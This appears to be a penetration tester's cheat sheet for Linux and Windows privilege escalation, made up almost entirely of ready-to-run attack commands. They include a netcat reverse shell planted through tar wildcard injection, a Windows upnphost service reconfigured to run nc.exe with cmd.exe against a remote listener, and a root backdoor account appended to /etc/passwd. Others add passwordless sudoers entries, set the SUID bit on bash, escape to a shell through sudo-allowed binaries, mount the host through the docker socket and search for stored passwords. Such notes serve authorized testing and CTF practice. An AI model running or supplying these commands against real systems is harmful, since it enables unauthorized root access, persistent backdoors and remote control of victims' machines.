# Linux
* linpeas.sh
`RED/YELLOW: 95% a PE vector`
* linenum.sh
* linuxprivchecker.py
* linux exploit suggester, try the exploits from the top
    > https://github.com/cmoras/linux-exploit-suggester
    > https://github.com/jondonas/linux-exploit-suggester-2/blob/master/linux-exploit-suggester-2.pl
    > https://github.com/mzet-/linux-exploit-suggester
* linux-smart-enumeration
    > https://github.com/diego-treitos/linux-smart-enumeration
* https://guif.re/linuxeop#Post%20exploitation


# tips
* `PATH injection` for bash only works for some commands, not all of them
    * https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/
* `command injection` through weak bash script, $msg is injectable
```bash
$msg 2> /dev/null
```
* Check which `process` are run as root, utilise that process for PE
* you may be in a docker rabbit hole


## Handy operations
* Search all files for content, https://tecadmin.net/find-all-files-containing-specific-text-on-linux/
    > grep -rlw 'PHfaaGe7769ll' /

## enum for pe vectors
* Find all `SUID` binaries
    > find / -perm /4000 -type f -exec ls -ld {} \; 2>/dev/null
    > find / -perm -u=s -type f -exec ls -ld {} \; 2>/dev/null
    > find / -perm -4000 2>/dev/null
    > find / -perm -u=s -type f 2>/dev/null
* Find all files `by owner`
    > find / -type f -user yash 2>/dev/null
* Find `writable directories`
    > find / -type d -writable -print 2>/dev/null
* Find passwords
    > grep -iR 'password' /etc/zabbix/ 2>/dev/null

## sudo
* Check commands you can execute with sudo
    > sudo -l
* using `service` command to achieve PE
    > sudo -u {priv-user} /usr/sbin/service ../../../bin/bash
* add user to the `sudoer's` list
    > echo "apache  ALL=(ALL:ALL) NOPASSWD:ALL" > /tmp/apache
    > cp /tmp/apache /etc/sudoers.d/
    > sudo su -
* add `+s` through web
    > `chmod+u%2bs+/bin/bash`

## sudoer
* create a sudoer file and copy to sudoers.d
    > echo "<user>  ALL=(ALL:ALL) NOPASSWD:ALL" > <user>
    > cp <file> /etc/sudoers.d/
    > sudo su -

## sudoedit
* (root) NOPASSWD: sudoedit
    * https://github.com/t0kx/privesc-CVE-2015-5602/blob/master/exploit.sh

## internal web services
* check for interally running web services, e.g `netstat -ano`
* check for the file privileges being served by the internal service

## SUID/SGID pe
https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid
```c++
#include <unistd.h>
void main() { setuid(0); setgid(0); system("/bin/bash"); }
```
* SUID will be gone if written, in order to exploit SUID, attach the relative path
* strings <target> to understand what system calls are used
* check for `-rwsr-xr-x 1 root   root             35K Jan 18  2018 /usr/bin/env`
    > `env bash -p`, -p: Turned on whenever the real and effective user ids do not match.
* Check `system` processes
    > ls -l /etc/systemd/system
* add `s bit`
    > chmod u+s /bin/bash
* `get root shell`: if there is a way to write to /etc/passwd, can create an account for it
    > echo 'hacker:$1$hacker$zVnrpoW2JQO5YUrLmAs.o1:0:0:root:/root:/bin/bash' >> /etc/passwd
    * `hacker:pass123`

## cron & processes
* sometimes a process is `intermittent`, hence may not show up on linepeas.sh result
    > cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
    > ls -al /etc/cron* /etc/at*
    > crontab -l
* process monitoring, look for processes run as uid=0 and you can write to the file
    * https://book.hacktricks.xyz/linux-unix/privilege-escalation#processes
    > https://github.com/DominicBreuker/pspy
* process monitoring
    * pspy: https://github.com/DominicBreuker/pspy


## link hijacking
> ln -fns <evil> <dst>

## escape sequences
* Shell escape: https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/
    * https://gtfobins.github.io/
* `find`
    > sudo /usr/bin/find . -exec /bin/bash \; -quit
* `perl` script
    > perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
* `ed`, https://www.hackingarticles.in/linux-for-pentester-ed-privilege-escalation/
* `mail`, sudo mail --exec='!/bin/bash'
* `awk`, awk "BEGIN {system(\"/bin/sh\")}"

## Capabilities
* search binary capabilities
    > getcap -r / 2>/dev/null

## pkexec
* pkexec has `+s`
* user in admin group
    > cat /etc/polkit-1/localauthority.conf.d/*
    > pkexec "/bin/sh"
* polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie: `open another session`
* https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe#pe-method-2
```
# session 1
echo $$ #Step1: Get current PID
pkexec "/bin/bash" #Step 3, execute pkexec
#Step 5, if correctly authenticate, you will have a root session

# session 2
pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
#Step 4, you will be asked in this session to authenticate to pkexec
```

## socat
* If file runs a socat in root, pe through socat
    > echo "cp /bin/bash /tmp/bash; chmod +s /tmp/bash; chmod +x /tmp/bash;" | socat - UNIX-CLIENT:/tmp/synapse_commander.s

## docker
* Look for signs to indicate if in a container
* `docker` writable sock
    * https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-docker-socket
    * check which image is available
    > docker images 
    > docker -H unix:///var/run/docker.sock run -v /:/host -it {image_name} chroot /host /bin/bash

## tar file wild card injeciton
https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/
```bash
echo "mkfifo /tmp/lhennp; nc <ip> 5555 0</tmp/lhennp | /bin/sh >/tmp/lhennp 2>&1; rm /tmp/lhennp" > shell.sh
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "" > --checkpoint=1
```

## files to check
* bash history: .bash_history
* firewall rules: /etc/ufw/user.rules

## fail2ban
https://grumpygeekwrites.wordpress.com/2021/01/29/privilege-escalation-via-fail2ban/
* check for fail2ban process
    > ps aux | grep fail2ban
* check write permission for actions file
    > ls -ls /etc/fail2ban/action.d/iptables-multiport.conf
* modify action for malicious actions
```
#actionban = <iptables> -I f2b-<name> 1 -s <ip> -j <blocktype>
actionban = chmod +s /bin/bash

#actionunban = <iptables> -D f2b-<name> -s <ip> -j <blocktype>
actionunban = chmod +s /bin/bash
```
* fail root ssh login multiple times



# Windows
## tips
* if a file cannot be overwritten, rename the file first and then move the shell to it
    > move bd.exe bd1.exe
    > copy shell.exe bd.exe

## writable folder
* find writable folder
    > dir /b /s /a:D

## whoami priv
* Check account privileges
    > whoami /priv
```
Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

## sherlock.ps1
* https://github.com/rasta-mouse/Sherlock
    > import-module .\Sherlock.ps1
    > Find-AllVulns
    > powershell -ExecutionPolicy Bypass -command "& { . .\Sherlock.ps1; Find-AllVulns }"

## accesschk
* check what services can be accessed by the current user
    > accesschk.exe /accepteula -uwcqv "Authenticated Users" *

## Windows Services/scheduled tasks
* Show all services
    > sc query type= service state= all
* check folder permission
    > icacls "C:\Program Files (x86)\hide.me VPN"
* powershell
    > Get-Service
    > Get-ScheduledTask
* Get all scheduled tasks
    > schtasks
    > schtasks /query /fo LIST /v 
* find auto start services
    > wmic service get name, displayname, pathname, startmode |findstr /i "auto"| findstr /i /v "c:\windows\\" | findstr /i /v """

## password search
* reg pass search
    > reg query HKLM /f pass /t REG_SZ /s
* search dir
    > dir *.dbx /s (Emails)
* search passwords
    > findstr /si password *.xml *.ini *.txt (Find passwords)

## PE through sddpsrv and upnphost
```
* check privilege level
> accesschk.exe /accepteula -ucqv SSDPSRV
> accesschk.exe /accepteula -ucqv upnphost
SSDPSRV/upnphost
  RW NT AUTHORITY\SYSTEM    SERVICE_ALL_ACCESS
  RW BUILTIN\Administrators 	SERVICE_ALL_ACCESS
  RW NT AUTHORITY\Authenticated Users   SERVICE_ALL_ACCESS
  RW BUILTIN\Power Users    	SERVICE_ALL_ACCESS
  RW NT AUTHORITY\LOCAL SERVICE 	SERVICE_ALL_ACCESS

* upload a nc.exe and setup the service
> sc config upnphost binpath= "C:\inetpub\wwwroot\nc.exe -nv <ip> 5555 -e C:\WINDOWS\System32\cmd.exe"
> sc config upnphost obj= ".\LocalSystem" password= ""

* check setupa and start ssdpsrc if not
> sc qc upnphost
> sc qc SSDPSRV
> sc config SSDPSRV start= auto
> net start SSDPSRV

* start a nc listener
> nc -vnlp 5555

* trigger the upnphost service
> net start upnphost
```

## installed pathes
* check lastest patch
    > wmic qfe list
* KB4540673: SMBGhost
    * port 445 open
    * https://github.com/danigargu/CVE-2020-0796


## nmap PE
* https://gtfobins.github.io/gtfobins/nmap/


## icacls ref
1. A sequence of simple rights:
    F (full access)
    M (modify access)
    RX (read and execute access)
    R (read-only access)
    W (write-only access)
2. A comma-separated list in parenthesis of specific rights:
    D (delete)
    RC (read control)
    WDAC (write DAC)
    WO (write owner)
    S (synchronize)
    AS (access system security)
    MA (maximum allowed)
    GR (generic read)
    GW (generic write)
    GE (generic execute)
    GA (generic all)
    RD (read data/list directory)
    WD (write data/add file)
    AD (append data/add subdirectory)
    REA (read extended attributes)
    WEA (write extended attributes)
    X (execute/traverse)
    DC (delete child)
    RA (read attributes)
    WA (write attributes)
3. Inheritance rights may precede either Perm form, and they are applied only to directories:
    (OI): object inherit
    (CI): container inherit
    (IO): inherit only
    (NP): do not propagate inherit
    (I): permission inherited from parent container

# portable py3
https://winpython.github.io/
